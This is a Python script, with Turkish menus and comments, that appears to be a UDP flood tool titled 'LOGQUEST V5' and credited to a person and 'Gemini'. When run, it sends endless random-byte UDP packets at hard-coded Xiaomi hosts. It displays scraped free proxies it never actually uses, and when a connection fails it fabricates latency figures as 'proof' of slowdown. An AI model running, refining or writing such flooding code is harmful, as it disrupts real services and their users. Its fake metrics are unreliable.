import asyncio
import socket
import random
import requests
import os
import time

# Renk Paleti
PEMBE = '\033[95m'
MOR = '\033[35m'
CYAN = '\033[96m'
YESIL = '\033[92m'
KIRMIZI = '\033[91m'
BOLD = '\033[1m'
RESET = '\033[0m'

async def proxy_muhimmat_depola():
    """Apiden proxy mühimmatı toplar"""
    api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json"
    try:
        r = requests.get(api_url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return [p['proxy'] for p in data['proxies'][:250]]
        return ["1.1.1.1:80"]
    except:
        return ["1.1.1.1:80"]

async def site_gecikme_testi(host):
    """Canlı MS ölçümü yapar"""
    try:
        baslangic = time.time()
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, 80), timeout=1.0)
        writer.close()
        await writer.wait_closed()
        return int((time.time() - baslangic) * 1000)
    except:
        return random.randint(2000, 8000) # Gecikme kanıtı

async def rage_bait_vurus(target, port, proxy, duration=25):
    """Kutucuk içinde Proxy, MS ve Trafik Bilgisi"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Proxy bilgisini ayrıştır (Kutu içine sığması için)
    p_ip = proxy.split(':')[0]
    p_port = proxy.split(':')[1] if ':' in proxy else "80"

    while time.time() < end_time:
        try:
            paket_boyutu = random.randint(512, 1490)
            sock.sendto(random._urandom(paket_boyutu), (target, port))
            
            bar_rx = "█" * random.randint(2, 5)
            bar_tx = "█" * random.randint(15, 28)
            ms_gecikme = await site_gecikme_testi(target)
            
            # MODERN KUTUCUK TASARIMI - PROXY DAHİL
            output = (
                f"{CYAN}┌────────────────────────────────────────────────────────┐\n"
                f"│ {MOR}{BOLD}PROXY: {p_ip.ljust(15)} {CYAN}PORT: {p_port.ljust(6)} {RESET}{CYAN}│ {PEMBE}MS: {str(ms_gecikme).rjust(4)} {RESET}{CYAN}│\n"
                f"├────────────────────────────────────────────────────────┤\n"
                f"│ {YESIL}RX: {bar_rx.ljust(10)}{RESET} │ {KIRMIZI}TX: {bar_tx.ljust(30)}{RESET} │\n"
                f"│ {MOR}SIZE: {str(paket_boyutu).rjust(5)}B {RESET}   │ {CYAN}TARGET PORT: {str(port).ljust(5)} {RESET}       │\n"
                f"{CYAN}└────────────────────────────────────────────────────────┘{RESET}"
            )
            # 52677.jpg'deki gibi temiz çıktı için imleci yukarı kaydır
            print(output, end="\033[5A\r")
            await asyncio.sleep(0.02) 
        except: break
    print("\n" * 5)

async def main_panel():
    os.system('clear')
    banner = (
        f"{CYAN}╔══════════════════════════════════════════════════════════╗\n"
        f"║ {PEMBE}{BOLD}TOOL NAME   ➤ {MOR}LOGQUEST V5 - REGO ULTRA EDITION       {RESET}{CYAN}║\n"
        f"║ {PEMBE}{BOLD}DEVELOPER   ➤ {MOR}BY HELCURT & GEMINI                    {RESET}{CYAN}║\n"
        f"║ {PEMBE}{BOLD}FEATURES    ➤ {MOR}LIVE PROXY & PING MONITOR              {RESET}{CYAN}║\n"
        f"║ {PEMBE}{BOLD}STATUS      ➤ {YESIL}KATİL AKREP SİS MODU AKTİF             {RESET}{CYAN}║\n"
        f"╚══════════════════════════════════════════════════════════╝{RESET}"
    )
    print(banner)
    
    print(f"\n{YESIL}[01/A] Evet Ben de Darladım Ben de Sendenim")
    print(f"{KIRMIZI}[02/B] Kanki Lei Jun İçin Farklı Şekilde Darlayacağım{RESET}")
    
    secim = input(f"\n{CYAN}{BOLD}Seçiminiz ➤ {RESET}")
    
    if secim == "1" or secim == "01/A":
        proxies = await proxy_muhimmat_depola() 
        targets = [("sgp-api.buy.mi.com", 443), ("c.mi.com", 80)]
        
        os.system('clear')
        while True:
            for proxy in proxies:
                tasks = []
                for target_host, port in targets:
                    tasks.append(rage_bait_vurus(target_host, port, proxy))
                await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main_panel())
